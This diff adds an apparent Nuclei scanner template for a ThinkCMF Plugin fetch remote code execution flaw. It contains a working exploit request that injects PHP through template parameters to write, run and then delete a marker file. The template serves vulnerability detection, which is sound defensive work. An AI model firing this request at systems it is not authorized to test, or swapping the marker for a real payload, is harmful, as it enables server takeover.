@@ -1,0 +1,46 @@
+id: thinkcmf-fetch-template-injection-rce
+
+info:
+  name: ThinkCMF Plugin Fetch Remote Code Execution
+  author: bl
+  severity: critical
+  description: |
+    A remote code execution vulnerability exists in ThinkCMF via the Plugin fetch interface. The endpoint allows attackers to inject PHP code through template parameters, which may lead to arbitrary file creation and execution on the server.
+  reference:
+    - https://github.com/Mr-xn/Penetration_Testing_POC/blob/5162375b6621d20063d74edb50b8b4e8a12832ee/web/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C.md?plain=1#L36
+  impact: |
+    Successful exploitation allows attackers to execute arbitrary PHP code on the target server. This can lead to full system compromise, data theft, and persistent backdoor access.
+  remediation: |
+    Restrict access to plugin rendering interfaces, validate and sanitize template input, and disable dangerous PHP functions such as file write and dynamic execution in production environments.
+  tags: ThinkCMF
+
+variables:
+  r1: "{{rand_base(4)}}"
+  r2: "{{rand_base(20)}}"
+
+http:
+  - raw:
+      - |
+        POST /index.php?g=Api&m=Plugin&a=fetch HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+
+        templateFile=/../../../public/index&prefix=''&content=<php>file_put_contents("{{r1}}.php",'<?php echo "{{r2}}"; unlink(__FILE__); ?>')</php>
+
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+
+  - method: GET
+    path:
+      - "/{{r1}}.php"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{r2}}"
+      - type: status
+        status:
+          - 200
